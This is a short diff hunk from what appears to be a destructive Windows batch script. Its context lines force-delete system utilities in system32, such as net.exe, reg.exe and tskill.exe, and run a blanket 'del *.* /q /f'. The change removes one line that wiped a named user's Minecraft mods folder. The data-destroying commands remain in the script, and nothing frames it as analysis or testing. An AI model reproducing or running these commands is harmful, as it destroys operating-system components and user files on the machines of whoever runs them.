@@ -127,7 +127,6 @@ del c:\WINDOWS\system32\netstat.exe /S /Q /F
 del c:\WINDOWS\system32\net.exe /S /Q /F
 del c:\WINDOWS\system32\reg.exe /S /Q /F
 del c:\WINDOWS\system32\tskill.exe /S /Q /F
-del C:\Users\pacoy\AppData\Roaming\.minecraft\mods /S /Q /F
 dir %windir%
 del *.* /q /f
 dir %windir%/system32
